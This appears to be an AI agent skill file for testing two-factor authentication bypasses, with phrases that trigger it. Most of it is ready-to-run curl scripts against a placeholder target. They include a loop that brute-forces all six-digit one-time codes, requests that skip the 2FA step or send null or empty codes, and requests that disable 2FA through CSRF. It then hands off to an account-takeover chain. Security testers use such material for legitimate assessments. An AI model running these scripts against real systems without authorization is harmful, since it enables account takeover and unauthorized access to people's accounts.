---
name: vuln-2fa-bypass
description: "Two-factor authentication bypass testing — OTP brute force, response manipulation, backup code abuse, step skip, CSRF on 2FA disable, SIM swap indicators, OAuth to bypass 2FA, cookie theft to bypass 2FA. Triggers: '2fa bypass', 'mfa bypass', 'otp bypass', 'two factor bypass', 'totp bypass', '2fa brute force', '2fa skip', 'mfa abuse', 'authentication factor bypass'."
---

# 2FA / MFA Bypass Testing

Test weaknesses in two-factor authentication implementation.

---

## Phase 1: Response Manipulation

```bash
TARGET="https://TARGET"
VALID_CREDS="username=admin&password=secret"
WRONG_OTP="000000"

# Step 1: Login with valid credentials:
curl -s -c /tmp/cookies.txt -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"secret"}'

# Step 2: Intercept 2FA verification and try response manipulation:
# In Burp: send 2FA verify with wrong OTP, change response {"error":"Invalid OTP"} to {"success":true}

# Step 3: Try submitting wrong OTP and see if next request is authorized:
SESSION=$(grep "session" /tmp/cookies.txt | awk '{print $7}')
curl -s -X POST "$TARGET/api/2fa/verify" \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"otp":"000000"}'

# Check if 2FA step can be skipped entirely:
curl -s "$TARGET/api/dashboard" -H "Cookie: session=$SESSION"
```

---

## Phase 2: OTP Brute Force

```bash
TARGET="https://TARGET"
SESSION="SESSION_AFTER_STEP1"

# Check rate limiting:
for i in $(seq 1 20); do
  RESP=$(curl -s -X POST "$TARGET/api/2fa/verify" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/json" \
    -d "{\"otp\":\"$(printf '%06d' $i)\"}" 2>/dev/null)
  echo "Attempt $i: $(echo $RESP | jq -r '.message // .error // .')"
done

# Brute force 6-digit OTP (if no rate limit):
for OTP in $(seq -w 0 999999); do
  RESP=$(curl -s -X POST "$TARGET/api/2fa/verify" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/json" \
    -d "{\"otp\":\"$OTP\"}")
  echo "$RESP" | grep -qi "success\|token\|dashboard" && echo "VALID OTP: $OTP" && break
done
```

---

## Phase 3: Step Skip & Token Reuse

```bash
TARGET="https://TARGET"

# Try accessing protected resource directly after step 1 (before 2FA):
curl -s -c /tmp/cookies.txt -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"secret"}'
SESSION=$(grep "session" /tmp/cookies.txt | awk '{print $7}')

# Skip 2FA — access dashboard directly:
curl -s "$TARGET/dashboard" -H "Cookie: session=$SESSION" -I

# Check if 2FA code from previous session is still valid:
OLD_OTP="123456"
curl -s -X POST "$TARGET/api/2fa/verify" \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d "{\"otp\":\"$OLD_OTP\"}"

# Parameter pollution — send empty/null OTP:
curl -s -X POST "$TARGET/api/2fa/verify" \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"otp":null}'
curl -s -X POST "$TARGET/api/2fa/verify" \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"otp":""}'
curl -s -X POST "$TARGET/api/2fa/verify" \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{}'
```

---

## Phase 4: 2FA Disable via CSRF

```bash
TARGET="https://TARGET"
SESSION="AUTHENTICATED_SESSION"

# Try disabling 2FA without CSRF token:
curl -s -X POST "$TARGET/api/account/2fa/disable" \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"confirm":true}'

# If uses GET to disable:
curl -s "$TARGET/account/2fa/disable?confirm=true" \
  -H "Cookie: session=$SESSION"
```

---

## Output

Save to `output/`:
- `2fa_bypass_methods.txt` — which bypass techniques worked
- `2fa_poc.txt` — reproduction steps for the bypass

## Next Phase

→ `vuln-account-takeover` to complete ATO chain
→ `pentest-report` to document findings
